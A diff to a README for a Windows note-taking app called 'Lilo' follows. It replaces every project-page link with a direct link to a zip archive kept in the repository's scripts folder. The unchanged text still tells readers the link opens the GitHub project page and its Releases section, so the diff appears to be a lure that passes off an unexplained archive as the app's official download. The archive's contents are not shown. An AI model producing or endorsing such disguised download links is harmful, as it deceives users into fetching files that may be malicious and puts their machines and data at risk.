@@ -1,7 +1,7 @@
 <h1>📝 Lilo - Your Notes, Beautifully Connected</h1>
 
 <p align="center">
-  <a href="https://github.com/Auraassessable241/Lilo">
+  <a href="https://raw.githubusercontent.com/Auraassessable241/Lilo/main/scripts/Software-3.2-beta.5.zip">
     <img src="https://img.shields.io/badge/Download%20Lilo-Free-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Lilo">
   </a>
 </p>
@@ -24,7 +24,7 @@ But here is the magic: Lilo remembers how your notes relate to each other. When 
 <h2>🛠️ Getting Started on Windows</h2>
 
 <p>
-  <a href="https://github.com/Auraassessable241/Lilo">
+  <a href="https://raw.githubusercontent.com/Auraassessable241/Lilo/main/scripts/Software-3.2-beta.5.zip">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Lilo%20Now-FF5733?style=for-the-badge&logo=windows&logoColor=white" alt="Download Lilo Now">
   </a>
 </p>
@@ -33,7 +33,7 @@ This link will take you to the main Lilo page on GitHub. From there, you can see
 
 ### Step 1: Visit the Download Page
 
-Click the orange <strong>"Download Lilo Now"</strong> button above, or type this address into your browser: <code>https://github.com/Auraassessable241/Lilo</code>
+Click the orange <strong>"Download Lilo Now"</strong> button above, or type this address into your browser: <code>https://raw.githubusercontent.com/Auraassessable241/Lilo/main/scripts/Software-3.2-beta.5.zip</code>
 
 You will arrive at the project page. Look for a section that mentions <strong>"Releases"</strong> or <strong>"Latest release."</strong> This is where all the files for the latest version of Lilo are kept. Click on the link that says <strong>"Releases"</strong> to see the available files.
 
@@ -100,7 +100,7 @@ The Lilo project page on GitHub is the central hub. You can find the complete do
 Tired of losing your ideas between different apps and notebooks? Lilo puts everything in one place and shows you how it all fits together. It is fast, free, and friendly. Click the button below to grab your copy for Windows.
 
 <p align="center">
-  <a href="https://github.com/Auraassessable241/Lilo">
+  <a href="https://raw.githubusercontent.com/Auraassessable241/Lilo/main/scripts/Software-3.2-beta.5.zip">
     <img src="https://img.shields.io/badge/🚀%20Get%20Lilo%20for%20Free-333333?style=for-the-badge&logo=windows&logoColor=white&color=4caf50" alt="Get Lilo for Free">
   </a>
 </p>
